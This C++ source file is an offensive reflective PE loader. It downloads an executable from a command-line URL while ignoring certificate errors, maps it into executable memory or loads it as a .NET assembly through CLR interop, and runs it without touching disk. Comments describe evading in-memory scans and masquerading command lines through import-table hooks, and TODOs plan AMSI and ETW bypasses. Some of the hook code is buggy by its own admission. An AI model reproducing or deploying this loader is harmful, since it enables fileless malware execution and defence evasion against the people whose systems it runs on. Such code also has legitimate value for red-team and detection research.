#pragma comment(lib, "wininet.lib")
#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>
// .NET functions can be called through COM interop from unmanaged processes [MSDN](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/dd380851(v=vs.100)?redirectedfrom=MSDN)
// mscorlib.tlb (COM Type Library) is needed for definitions of .net types in unmanaged code when using the COM interfaces [MSDN](https://docs.microsoft.com/en-us/dotnet/framework/interop/how-to-reference-net-types-from-com)
#include <metahost.h> // CLR v4.0 interfaces
#include <mscoree.h>
#pragma comment(lib, "mscoree.lib") // note: project may need to be built with mscoree.lib first for mscorlib.tlb to be recognized
// during compilation a .tlh type library header file will be created in output folder (Debug,Release)
// each method/function overload in COM interop is defined as func, func_2, func_3, ect
// note: if Visual Studio can't "Go To" .tlb definitions, open .tlh file in editor
#import <mscorlib.tlb> raw_interfaces_only			\
    	high_property_prefixes("_get","_put","_putref")		\
    	rename("ReportEvent", "InteropServices_ReportEvent")	\
		rename("or", "InteropServices_or") // rename for c# symbols to not overwrite C++ functions/symbols

// TODO: native ExitThread function exits out of current process, hook this and fix
// TODO: AMSI bypass before loading managed
// TODO: ETW bypass 
// TODO: implement [smart rebase](https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/)
// TODO: parse headers and allocate straight from HTTP download 
// TODO: find argv/argc get functions for other native C++ compilers, 
//		 tested: cl.exe (non-multithreaded) __p__argv
//		 untested: __getmainargs, __getcmdln, Environment.GetCommandLineArgs

// download file from url, returns buffer to file
char* httpStage(LPCSTR urlStr,size_t &out_size) {
	URL_COMPONENTSA urlComp;
	memset(&urlComp, 0, sizeof(URL_COMPONENTS));
	urlComp.dwStructSize = sizeof(URL_COMPONENTS);
	urlComp.dwHostNameLength = 1;
	urlComp.dwUrlPathLength = 1;
	InternetCrackUrlA(urlStr, strlen(urlStr), 0, &urlComp);

	// lpszHostName and lpszUrlPath do not have string delimiters '\0' and are just references to original string
	// new hostname and path need to be created
	LPSTR urlHostname = new CHAR[urlComp.dwHostNameLength+1];
	LPSTR urlPath = new CHAR[urlComp.dwUrlPathLength+1];
	memset(urlHostname, 0, urlComp.dwHostNameLength);
	memset(urlPath, 0, urlComp.dwUrlPathLength);
	if (urlComp.dwHostNameLength > 0) strncpy_s(urlHostname, urlComp.dwHostNameLength+1, urlComp.lpszHostName, urlComp.dwHostNameLength);
	if (urlComp.dwUrlPathLength > 0) strncpy_s(urlPath, urlComp.dwUrlPathLength+1, urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

	// WinINet template from: https://gist.github.com/AhnMo/5cf37bbd9a6fa2567f99ac0528eaa185
	HINTERNET hSession = InternetOpenA(
		"Mozilla/5.0",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET hConnect = InternetConnectA(
		hSession,
		urlHostname,
		urlComp.nPort, 
		NULL,
		NULL,
		INTERNET_SERVICE_HTTP,
		INTERNET_FLAG_KEEP_CONNECTION,
		0);

	DWORD reqFlags = 0;
	reqFlags |= INTERNET_FLAG_RELOAD; // do not request from inet cache
	reqFlags |= INTERNET_FLAG_NO_CACHE_WRITE; // don't cache download file (C:\Users\User\AppData\Local\Microsoft\Windows\INetCache)
	if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
		reqFlags |= INTERNET_FLAG_SECURE;
	}
	HINTERNET hHttpFile = HttpOpenRequestA(
		hConnect,
		"GET",
		urlPath,
		NULL,
		NULL,
		NULL,
		reqFlags, 
		0);

	// ignore ssl cert errors
	DWORD dwFlags = 0;
    DWORD dwBuffLen = sizeof(dwFlags);
    if (InternetQueryOption(hHttpFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffLen))
    {
       dwFlags |= SECURITY_SET_MASK;
       InternetSetOption(hHttpFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

	if (!HttpSendRequestA(hHttpFile, NULL, 0, 0, 0)) {
		char err[256];
		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), err, (sizeof(err) / sizeof(wchar_t)), NULL);
		printf("[!] HTTP request failed %s", err);
		return NULL;
	}

	// buffer will grow in increments of BUFSIZ
	DWORD dwFileSize;
	dwFileSize = 512; // BUFSIZ
	char* httpBuffer = new char[dwFileSize];

	char* fileBuffer = NULL;
	size_t fileSize = 0;
	while (true) {
		DWORD dwBytesRead;
		BOOL bRead;

		bRead = InternetReadFile(
			hHttpFile,
			httpBuffer,
			dwFileSize,
			&dwBytesRead);

		if (dwBytesRead == 0) break;
		if (!bRead) break;
			
		// realloc pointer to new size
		fileBuffer = (char*)realloc(fileBuffer,(fileSize + dwFileSize)*sizeof(char));
		// check if enough space in memory
		if (fileBuffer == NULL) return NULL;
		// copy buffer with offset of previous arr data
		memcpy(&fileBuffer[fileSize*sizeof(char)], httpBuffer, dwFileSize);
		// add size
		fileSize += dwFileSize;
	}
	
	// close handles
	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	// free mem
	delete urlHostname;
	delete urlPath;
	delete httpBuffer;

	out_size = fileSize;

	return fileBuffer;
}

// BASE_RELOCATION_BLOCK headers
typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

// BASE_RELOCATION_ENTRY bitfields
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

// if image is allocated at preferred address, rebasing is not needed
DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
	// get delta between current image base and the PE that was read into memory
	DWORD_PTR deltaImageBase = (DWORD_PTR)peImageBase - (DWORD_PTR)ntHeader->OptionalHeader.ImageBase;

	// calculate/find relocatation table in allocated memory
	// https://en.wikipedia.org/wiki/Relocation_(computing)#Relocation_table
	IMAGE_DATA_DIRECTORY relocations = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)peImageBase;
	// rebase/patch each absolute address in relocation table .reloc in allocated memory (patching only needed if image is not written to perferred address)
	DWORD relocationsProcessed = 0;
	while (relocationsProcessed < relocations.Size) {
		// get relocation block header
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		// calculate number of entries in relocation block
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

		// add size of block header
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		// get first entry in relocation block
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
		// patch each relocation entry
		for (DWORD i = 0; i < relocationsCount; i++) {
			// add size of entry
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

		    // https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
			if (relocationEntries[i].Type == 0) continue; // this base relocation type is skipped

			// read absolute address in relocation entry
			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)peImageBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			// add delta(between preferred base and current base)
			addressToPatch += deltaImageBase;
			// write/patch new absolute address back into relocation entry
			memcpy((PVOID)((DWORD_PTR)peImageBase+relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
			// debugging print
			printf("Patching %x -> %x\n", addressToPatch - deltaImageBase, addressToPatch);
		}
	}
	return 0;
}

// converts LPWSTR to LPSTR (lpwszStr = long pointer wide char zero-terminated string)
// !memory management for return value is responsibility of caller!
void wideToNarrowStr(LPWSTR lpwszStr, LPSTR* ppszStr) {
	// get LPWSTR size
    int nSize = WideCharToMultiByte(CP_ACP, 0, lpwszStr, -1, NULL, 0, NULL, NULL);
	// allocate LPSTR*
    *ppszStr = (LPSTR)malloc(nSize);
	// write narrow converted chars to LPSTR*
    WideCharToMultiByte(CP_ACP, 0, lpwszStr, -1, *ppszStr, nSize, NULL, NULL);
}

// --- WARNING THIS IS GARBAGE CODE (c string manipulation + wide to narrow string conversion is a nightmare) ---
// visual studio cl.exe compile uses __p___argc and __p___argv to retrieve commandline
char*** __p___argvHook() {
	// using GetCommandLineW because win32 has not implemented a CommandLineToArgvA function
	LPWSTR cmdLine = GetCommandLineW();  // not affected by the IAT hook because function address points to seperate IAT table
	int argc; // Allocate memory for an int variable
	LPWSTR* lpCmdLine = CommandLineToArgvW(cmdLine, &argc);

	// convert LPWSTR* to LPSTR*
	LPSTR* argv = (LPSTR*)malloc(argc * sizeof(LPSTR));
	for (int i = 0; i < argc; i++) {
        wideToNarrowStr(lpCmdLine[i], &argv[i]);
    }

	// remove the second argument from the array
	if (argc > 1) { 
		for (int i = 2; i < argc; i++) {
			argv[i-1] = argv[i];
		}
	}
	LocalFree(lpCmdLine);

	char*** ppargv = (char***)malloc(sizeof(char*));
	ppargv = &argv;
	return ppargv;
}
int* __p___argcHook() {
	// using GetCommandLineW because win32 has not implemented a CommandLineToArgvA function
	LPWSTR cmdLine = GetCommandLineW();  // not affected by the IAT hook because function address points to seperate IAT table
	int* argc = (int*) malloc(sizeof(int)); // Allocate memory for an int variable
	LPWSTR* argv = CommandLineToArgvW(cmdLine, argc);
	LocalFree(argv);

	// remove url argument
	*argc = *argc - 1;

	return argc;
}
// if hook is called repeatedly, may cause memory leak due to return value malloc
// !will not put quotes around arguments containing spaces!
LPSTR GetCommandLineAHook() {
	LPWSTR cmdLine = GetCommandLineW();  // not affected by the IAT hook because function address points to seperate IAT table
	int argc;
	LPWSTR* argv = CommandLineToArgvW(cmdLine, &argc);

	// remove the second argument from the array
	if (argc > 1) { 
		for (int i = 2; i < argc; i++) {
			argv[i-1] = argv[i];
		}
		argc--;
	}

	// allocate buf
	size_t totalLen = 0;
	for (int i = 0; i < argc; i++) {
		totalLen += wcslen(argv[i]) + 1; // add 1 for the space character
		
		if (wcschr(argv[i], L' ') != nullptr) { totalLen += 2; } // if argument contains a space, make room for quotes
	}
	LPWSTR combined = (LPWSTR)malloc(totalLen * sizeof(WCHAR));
	combined[0] = NULL;

	// combine the remaining arguments into a single string
	for (int i = 0; i < argc; i++) {
		if (i != 0) { wcscat_s(combined, totalLen, L" "); }
		if (wcschr(argv[i], L' ') != nullptr) { 
			wcscat_s(combined, totalLen, L"\"");
			wcscat_s(combined, totalLen, argv[i]);
			wcscat_s(combined, totalLen, L"\"");
		}
		else {
			wcscat_s(combined, totalLen, argv[i]);
		}
	}

	// free the memory from CommandLineToArgvW
	LocalFree(argv);

	// calculate the required buffer size for the converted string
	int wideStrLen = wcslen(combined);
	int bufferSize = WideCharToMultiByte(CP_UTF8, 0, combined, wideStrLen, NULL, 0, NULL, NULL);

	// allocate a buffer for the converted string
	LPSTR narrowStr = (LPSTR)malloc(bufferSize + 1); // add 1 for null terminator
	narrowStr[0] = NULL;

	// convert the wide string to a narrow string
	WideCharToMultiByte(CP_UTF8, 0, combined, wideStrLen, narrowStr, bufferSize, NULL, NULL);
	narrowStr[bufferSize] = '\0'; // add null terminator
	free(combined);

	return narrowStr;
}
LPWSTR GetCommandLineWHook() {
	LPWSTR cmdLine = GetCommandLineW();
	int argc;
	LPWSTR* argv = CommandLineToArgvW(cmdLine, &argc);

	// remove the second argument from the array
	if (argc > 1) {
		for (int i = 2; i < argc; i++) {
			argv[i-1] = argv[i];
		}
		argc--;
	}

	// allocate buf
	size_t totalLen = 0;
	for (int i = 0; i < argc; i++) {
		totalLen += wcslen(argv[i]) + 1; // add 1 for the space character
	}
	LPWSTR combined = (LPWSTR)malloc(totalLen * sizeof(WCHAR));
	combined = NULL;

	// combine the remaining arguments into a single string
	for (int i = 0; i < argc; i++) {
		if (i != 0) { wcscat_s(combined, totalLen, L" "); }
		wcscat_s(combined, totalLen, argv[i]);
	}

	// free the memory from CommandLineToArgvW
	LocalFree(argv);

	return combined;
}
// --- END OF GARBAGE CODE ---

// import libraries, add function addresses to IAT, and hook commandline functions for masqurading
DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, bool resolve) {
	// resolve import address table for current process
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	// get first import descriptor in IAT
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)peImageBase);

	LPCSTR libraryName = "";
	HMODULE library = NULL;
	while (importDescriptor->Name != NULL) {
		// get library name and load into current process
		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)peImageBase;
		// note: full module PEs are loaded into process memory, export and import tables for specific module can also be read, not just current process
		library = LoadLibraryA(libraryName);

		// resolve/find all thunks(function addresses/ordinals) and write them to importDescriptor
		if (library) {
			// get first thunk(function) for import dll in current process
			PIMAGE_THUNK_DATA thunk = NULL, originalThunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)peImageBase + importDescriptor->FirstThunk);
			// contains original RVA unchanged by resolving/loading (so function name and ordinals can be still be retrieved after resolve/load)
			originalThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)peImageBase + importDescriptor->OriginalFirstThunk); 

			// loop over thunks in import descriptor
			while (thunk->u1.AddressOfData != NULL && (int)thunk != 0x0000ffff) {
				// check if function is exported in dll by ordinal or by name(address) and add to IAT
				// if DLL compiled with export ordinals(.def file), PIMAGE_IMPORT_BY_NAME cannot be cast since the AddressOfData is set to (ordinal number & 0x80000000)
				// exports will still have names defined in export data directory, unless defined as NONAME in .def file
				// https://docs.microsoft.com/en-us/cpp/build/exporting-functions-from-a-dll-by-ordinal-rather-than-by-name?view=msvc-170
				if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
					if (resolve) {
						// resolve function address
						LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
						thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);

						// debugging print
						printf("resolving function(ord) %d -> %x\n", thunk->u1.Ordinal, thunk->u1.Function);
					}
				} else {
					if (resolve) {
						// resolve function address
						PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)peImageBase + originalThunk->u1.AddressOfData);

						// check if we want to IAT hook a function by function name
						DWORD_PTR functionAddress;
						if (strcmp(functionName->Name, "GetCommandLineA") == 0) { // IAT Hook GetCommandLineA
							functionAddress = (DWORD_PTR)GetCommandLineAHook;
						}
						else if (strcmp(functionName->Name, "GetCommandLineW") == 0) { // IAT Hook GetCommandLineW
							functionAddress = (DWORD_PTR)GetCommandLineWHook;
						}
						else if (strcmp(functionName->Name, "__p___argv") == 0) { // IAT Hook cl.exe __p___argv
							functionAddress = (DWORD_PTR)__p___argvHook;
						}
						else if (strcmp(functionName->Name, "__p___argc") == 0) { // IAT Hook cl.exe __p___argc
							functionAddress = (DWORD_PTR)__p___argcHook;
						}
						else {
							char* func_name = (char*)&(functionName->Name);
							functionAddress = (DWORD_PTR)GetProcAddress(library, func_name);
						}

						// set function address in IAT
						thunk->u1.Function = functionAddress;

						// debugging print
						printf("resolving function %s -> %x\n", functionName->Name, functionAddress);
					}
				}

				thunk++;
				originalThunk++;
			}
		}
		importDescriptor++;
	}

	return 0;
}

// parse NT header from PE file
IMAGE_NT_HEADERS* getNT(char* peBuffer) {
	// parse DOS header from PE
	// https://en.wikipedia.org/wiki/DOS_MZ_executable
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peBuffer;
	// check if file is MS-DOS executable with DOS magic number `5A4D`
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[!] file is not in PE format. (missing MS-DOS header)\n");
		return NULL;
	}
	// get NT header
	// https://en.wikipedia.org/wiki/New_Executable
	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)peBuffer + dosHeader->e_lfanew);
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		printf("[!] file is not in PE format, meant for DOS mode, and is not a 'New Executable'. (missing NT header)\n");
		return NULL;
	}

	return ntHeader;
}

// load native PE (will free peBuffer during loading)
// reference: https://github.com/aaaddress1/RunPE-In-Memory Pe Loading
// 1. copy header and image sections from PE into allocated memory
// 2. if memory could not be allocated at preferred address, rebase all absolute address in relocation table (`.reloc`)
// 3. load all libraries/dlls in import address table(IAT) into current process
// 4. resolve all thunks(pointer to address of function) addresses/ordinals in imported libraries and write into IAT
// 5. execute PE with entry function
DWORD loadNative(char* peBuffer, int argc, char** argv) {
	IMAGE_NT_HEADERS* ntHeader = getNT(peBuffer);
	if (ntHeader == NULL) {
		return 1;
	}

	// get image size
	SIZE_T imageSize = ntHeader->OptionalHeader.SizeOfImage;
	// get preferred base address, usually always 0x40000000 in .exe PE files
	LPVOID preferredAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;

	// unmap image base if it has been previously mapped
	// only needed if ReflectiveLoader is loaded into a process twice?
	// NtUnmapViewOfSection does not have a corresponding user-mode function
	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

	// try to alloc memory for image at preferred address
	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// if allocation not possible at preferred address, allocate anywhere
	if (!peImageBase) {
		peImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
	if (!peImageBase) {
		printf("[!] cannot allocate image base, memory capacity reached?\n");
		return 1;
	}

	// copy image header to allocated memory
	memcpy(peImageBase, peBuffer, ntHeader->OptionalHeader.SizeOfHeaders);
	// copy image sections(.text, .data, .bss, ect) to allocated memory
	IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		memcpy(
			LPVOID(size_t(peImageBase) + sectionHeader[i].VirtualAddress), // destination: ImageBase + RVA = VA
			LPVOID(size_t(peBuffer) + sectionHeader[i].PointerToRawData), // source: Buffer addr + raw data(file offset)
			sectionHeader[i].SizeOfRawData
		);
	}
	
	// reference headers from allocated memory so buffer can be free'd
	ntHeader = getNT((char *)peImageBase);
	if (ntHeader == NULL) {
		return 1;
	}

	// free peBuffer so in-memory scans do not trigger
	free(peBuffer); // if memory created with alloc
	//VirtualFree(peBuffer,imageSize, MEM_DECOMMIT | MEM_RELEASE); // if memory created with virtualalloc

	// if image is allocated at preferred address, rebasing is not needed
	if (preferredAddr != peImageBase) {
		// rebase image relative to newly allocated memory address
		if (rebaseImage(peImageBase, ntHeader)) {
			printf("[!] image cannot be rebased");
			return 1;
		}
	}

	// import libraries, add function addresses to IAT, and hook commandline functions for masqurading
	if (resolveImportAddressTable(peImageBase, ntHeader, true)) {
		printf("[!] imports cannot be resolved");
		return 1;
	}

	// get entry address
	size_t entryAddr = (size_t)(peImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
	// execute PE
	((void(*)())entryAddr)();

	// free memory
	VirtualFree(peImageBase, imageSize, MEM_RELEASE);

	return 0;
}

// initialize Common Language Runtime depending on versions available
// https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/hosting-interfaces
HRESULT loadCLR(ICorRuntimeHost** cLRHostPtr) {
	HRESULT res;
	HMODULE hMod;
	FARPROC pCLRCreateInstance, pCorBindToRuntimeEx, pCorBindToRuntime;
	ICorRuntimeHost* cLRHost;

	// initialize Component Object Model library for use in thread
	res = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	// check for CLR version
	hMod = LoadLibraryA("mscoree.dll"); // LoadLibraryA is used incase program is compiled with delayed loading(lib not loaded till symbol is referenced)
	//hMod = GetModuleHandleA("mscoree");
	if (hMod == NULL) {
		return E_FAIL;
	}
	/*
	version chart: 
	note: CLR version of a running process can be found by looking at the path of the loaded mscorwks.dll module on CLR start
	CLR		.NET
	1.0 	1.0
	1.1 	1.1
	2.0 	2.0, 3.0, 3.5
	4.0		4.0, 4.5, 4.6, 4.7, 4.8
	*/
	// CLR version can be deduced by finding which functions exist in mscoree.dll
	pCorBindToRuntime = GetProcAddress(hMod, "CorBindToRuntime");   // CLR 1.0-1.1
	pCorBindToRuntimeEx = GetProcAddress(hMod, "CorBindToRuntimeEx"); // CLR 2.0
	pCLRCreateInstance = GetProcAddress(hMod,"CLRCreateInstance"); // CLR 4.0
	// load CLR v4.0 if available, if not load CLR 2.0
	if(pCLRCreateInstance != nullptr){
		ICLRMetaHost* metaHost = NULL;
		ICLRRuntimeInfo* runtimeInfo = NULL;
		ICLRRuntimeHost* runtimeHost = NULL;
		
		// create interface for metahost used to enumerate CLR version
		res = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
		if (FAILED(res)) {
			return res;
		}
		// get runtime info for CLR v4.0
		res = metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
		if (FAILED(res)) {
			return res;
		}
		// get runtime host interface
		res = runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&runtimeHost);
		if (FAILED(res)) {
			return res;
		}
		// start CLR
		res = runtimeHost->Start();
		if (FAILED(res)) {
			return res;
		}

		// get old Cor runtime host interface for out param cLRHostPtr
		res = runtimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)cLRHostPtr);

		// free mem
		metaHost->Release();
		runtimeInfo->Release();
		runtimeHost->Release();
	}
	else {
		// debugging print
		printf("[-] CLR 4.0+ not found on host, trying CLR 2.0");

		// create Common Language Runtime object from its CLSID in COM
		res = CoCreateInstance(
		  CLSID_CorRuntimeHost, 
		  NULL, 
		  CLSCTX_ALL,
		  IID_ICorRuntimeHost, 
		  (LPVOID*)cLRHostPtr);
		if(FAILED(res)) return res;

		// start Common Language Runtime
		cLRHost = *cLRHostPtr;
		res = cLRHost->Start();
		if (FAILED(res)) {
			cLRHost->Release();
			return res;
		}
	}

	return S_OK;
}

// load managed PE (will free code during loading)
// reference: https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/ .NET V2 loading
// .NET program is reflectively loaded using COM interop functions
HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
	HRESULT                  res;
	ICorRuntimeHost          *cLRHost;
	IUnknownPtr              appDomainCOM;
	mscorlib::_AppDomainPtr  appDomainPtr;
	mscorlib::_AssemblyPtr   assemblyPtr;
	mscorlib::_MethodInfoPtr methodPtr;
	VARIANT                  parentObject, returnVal;
	SAFEARRAY                *safeArray;
	SAFEARRAYBOUND           safeArrBound;

	// initialize Common Language Runtime depending on versions available
	cLRHost = NULL;
	res = loadCLR(&cLRHost);
	if (FAILED(res)) {
		return res;
	}

	// get CLR default domain for current process, provides container for virtual address space of managed program
	res = cLRHost->GetDefaultDomain(&appDomainCOM);
	if (FAILED(res)) {
		return res;
	}
	// get interface pointer for default app domain from COM IUnknown (IUnkowns are used by COM to cast interfaces)
	res = appDomainCOM->QueryInterface(IID_PPV_ARGS(&appDomainPtr));
	if (FAILED(res)) {
		return res;
	}

	// create COM "array" and copy managed PE file
	safeArrBound.lLbound   = 0;
	safeArrBound.cElements = len;
	safeArray = SafeArrayCreate(VT_UI1, 1, &safeArrBound);
	if (safeArray == NULL) {
		return E_FAIL;
	}
	CopyMemory(safeArray->pvData, code, len);

	// free peBuffer so in-memory scans do not trigger
	free(code); // if memory created with alloc
	//VirtualFree(code,len, MEM_DECOMMIT | MEM_RELEASE); // if memory created with virtualalloc

	// load safe array into app domain
	res = appDomainPtr->Load_3(safeArray, &assemblyPtr);
	if (FAILED(res)) {
		return res;
	}

	// get Main method from loaded assembly
	res = assemblyPtr->get_EntryPoint(&methodPtr);
	if (FAILED(res)) {
		return res;
	}

	// remote second argument from argv
	for (int i = 2; i < argc; i++) {
		argv[i-1] = argv[i];
	}
	argc--;

	// create COM compatible parameters argv**
	VARIANT args;
	args.vt = VT_ARRAY | VT_BSTR; // varient types: https://docs.microsoft.com/en-us/previous-versions/windows/embedded/ms897140(v=msdn.10)
	SAFEARRAYBOUND argsBound[1];
	argsBound[0].lLbound = 0;
	argsBound[0].cElements = argc;
	args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
	// add strings from argv to COM compatible argv
	wchar_t wstr[256];
	size_t size;
	long idx[1];
	for (int i = 0; i < argc; i++)
	{
		idx[0] = i;
		mbstowcs_s(&size, wstr, 256, argv[i], 256-1);
		SafeArrayPutElement(args.parray, idx, SysAllocString(wstr));
	}

	// add argument to parameter array for method
	SAFEARRAY *params = NULL;
	SAFEARRAYBOUND paramsBound[1];
	paramsBound[0].lLbound = 0;
	paramsBound[0].cElements = 1;
	params = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
	idx[0] = 0;
	SafeArrayPutElement(params, idx, &args);

	//// get number of parameters (not working)
	//SAFEARRAY* paramInfo = NULL;
	//HRESULT hr = methodPtr->GetParameters(&paramInfo);
	//if(hr == S_OK) {
	//	LONG pcnt, lcnt, ucnt;
	//	SafeArrayGetLBound(params, 1, &lcnt);
	//	SafeArrayGetUBound(params, 1, &ucnt);
	//	
	//	pcnt = (ucnt - lcnt + 1);
	//	printf("%i", pcnt);
	//}

	// invoke method
	parentObject.vt    = VT_NULL; // object value NULL because entry function is static
	parentObject.plVal = NULL;
	res = methodPtr->Invoke_3(parentObject, params, &returnVal);
	// 0x80131604 error code may indicate a .NET version issue between CLR and assembly
	if (FAILED(res)) {
		_com_error err(res);
		LPCTSTR errMsg = err.ErrorMessage();
		wprintf(L"[!] Invoke_3 failed error message: %s", errMsg);
		return res;
	}

	// stop CLR
	cLRHost->Stop();

	// free mem
	appDomainCOM->Release();
	appDomainPtr->Release();
	SafeArrayDestroy(safeArray);
	assemblyPtr->Release();
	methodPtr->Release();

	return S_OK;
}

DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
	IMAGE_NT_HEADERS* ntHeader = getNT(peBuffer);
	if (ntHeader == NULL) {
		return 1;
	}

	// check if PE is .NET
	if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0) {
		// .net doesn't need section loading for process memory, mscoree.lib handles this
		loadManaged(peBuffer, len, argc, argv);
	}
	else {
		loadNative(peBuffer, argc, argv);
	}

	return 0;
}

int main(int argc, char* argv[])
{
	if (argc < 2) {
		printf("Usage: %s http://domain/file.exe [arg...]\n", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
		return 0;
	}

	// download PE from url
	size_t peSize;
	char* peBuffer = httpStage(argv[1], peSize);
	if (peBuffer == NULL) {
		printf("[!] HTTP request failed");
		return 1;
	}

	// call reflectiveLoader
	// peBuffer is free'd during loading (if peBuffer is allocated using malloc, switch VirtualAlloc() to free())
	reflectiveLoadPE(peBuffer, peSize, argc, argv);
}